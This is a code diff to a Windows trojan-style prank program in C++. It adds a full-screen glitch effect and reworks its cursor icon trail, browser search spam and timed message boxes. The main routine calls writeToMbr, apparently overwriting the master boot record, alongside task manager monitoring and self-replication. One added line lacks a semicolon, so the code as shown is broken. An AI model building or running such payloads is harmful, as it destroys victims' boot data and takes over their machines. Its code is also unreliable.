@@ -22,6 +22,7 @@
 #endif
 
 // Link GDI, Multimedia, and Shell libraries
+#pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "shell32.lib")
@@ -136,6 +137,54 @@ void changeColors() {
     
     // Final clear when done
     InvalidateRect(NULL, NULL, TRUE);
+}
+
+void glitchEffect() {
+    // 1. Get Device Context for the entire screen
+    HDC hdc = GetDC(NULL);
+    if (!hdc) return;
+
+    // Get screen dimensions
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+    // Modern C++ Random Setup
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<int> distY(0, screenHeight - 20);
+    std::uniform_int_distribution<int> distSliceHeight(5, 30);
+    std::uniform_int_distribution<int> distOffsetX(-40, 40);
+    std::uniform_int_distribution<int> distGlitchType(0, 100);
+
+    // 2. Set timing duration for exactly 1 second (1000 ms)
+    auto startTime = std::chrono::steady_clock::now();
+    
+    while (std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::steady_clock::now() - startTime).count() < 1000) 
+    {
+        int y = distY(gen);
+        int sliceHeight = distSliceHeight(gen);
+        int offsetX = distOffsetX(gen);
+
+        // --- Glitch Effect A: Horizontal Strip Shift ---
+        // Copies a horizontal strip of the screen and offsets it left or right
+        BitBlt(hdc, offsetX, y, screenWidth, sliceHeight, hdc, 0, y, SRCCOPY);
+
+        // --- Glitch Effect B: Random Inversion / Color Artifacts ---
+        if (distGlitchType(gen) > 70) {
+            RECT rect = { 0, y, screenWidth, y + sliceHeight };
+            InvertRect(hdc, &rect); // Inverts colors in the strip for a CRT flash
+        }
+
+        // Brief delay to control the frequency of glitches and avoid choking CPU
+        std::this_thread::sleep_for(std::chrono::milliseconds(15));
+    }
+
+    // 3. Clean up Device Context
+    ReleaseDC(NULL, hdc);
+
+    // 4. Force Windows to redraw the entire screen to restore normal display
+    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW);
 }
 
 // --- RANDOM BEEP GENERATOR --- //
@@ -264,22 +313,35 @@ void cursorShakingPayload() {
 
 void cursorTrail() {
     POINT cursor;
+    // Standard system icons
     LPCSTR icons[] = { IDI_ERROR, IDI_WARNING, IDI_INFORMATION, IDI_QUESTION };
 
     while (!isEnding) {
-        HDC hdc = GetDC(0); // Get Desktop DC
+        HDC hdc = GetDC(NULL); // Get Desktop DC
         if (hdc) {
             GetCursorPos(&cursor);
+            
+            // Load the system icon
             HICON hIcon = LoadIcon(NULL, icons[rand() % 4]);
             
             if (hIcon) {
-                // FIXED: Use DrawIconEx with DI_NORMAL. 
-                // This ensures the icon's transparency mask is respected against the background.
-                // DrawIcon alone can sometimes fail to process the Alpha channel on modern Windows builds.
-                DrawIconEx(hdc, cursor.x, cursor.y, hIcon, 0, 0, 0, NULL, DI_NORMAL);
+                // DI_MASK | DI_IMAGE explicitly applies both the transparency mask 
+                // and the color image, eliminating the black background artifact.
+                DrawIconEx(
+                    hdc, 
+                    cursor.x, cursor.y, 
+                    hIcon, 
+                    0, 0, // 0, 0 retains default icon size (usually 32x32)
+                    0, 
+                    NULL, 
+                    DI_MASK | DI_IMAGE
+                );
+
+                // Note: Standard system icons loaded with LoadIcon(NULL, ...) 
+                // do not strictly require DestroyIcon, but calling it causes no harm.
                 DestroyIcon(hIcon); 
             }
-            ReleaseDC(0, hdc);
+            ReleaseDC(NULL, hdc);
         }
         std::this_thread::sleep_for(std::chrono::milliseconds(50));
     }
@@ -334,9 +396,9 @@ void replicationPayload() {
 
 void searchPayload() {
     std::vector<std::string> queries = {
-        "my computer is doing weird things wtf is happenin plz halp",
-        "bonzibuddy download", "how to buy weed?", "how to delete a virus?",
-        "pc optimizer pro", "how to create malware?", "how to create a ransomware"
+        "how to download bonzibuddy?",
+        "bonziworld", "pls help", "worst antivirus ever download",
+        "pc optimizer pro", "how to get dank memes", "roblox exploits"
     };
     for (const auto& q : queries) {
         std::string url = "https://www.google.com/search?q=" + q;
@@ -433,7 +495,7 @@ void spawnChaosBox(std::string text) {
 // --- TIMED MESSAGE BOXES --- //
 
 void timedMessagePayload() {
-    std::vector<std::string> msgs = { "hello", "expand dong", "bonzibuddy is the best", "lol", "still here?" };
+    std::vector<std::string> msgs = { "hello", "expand dong", "bonzibuddy is the best", "lol", "ok" };
     for (const auto& m : msgs) {
         std::thread(spawnChaosBox, m).detach();
         std::this_thread::sleep_for(std::chrono::seconds(10));
@@ -577,9 +639,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     writeToMbr();
     std::thread(taskManagerMonitor).detach();
     
+    
     // 5 Seconds - Change icons with a BonziBUDDY icon
     std::this_thread::sleep_for(std::chrono::seconds(5));
     changeSystemIcons();
+    std::thread(glitchEffect).detach()
 
     // 20 Seconds - Start sound payload and cursor shaking
     std::this_thread::sleep_for(std::chrono::seconds(15));
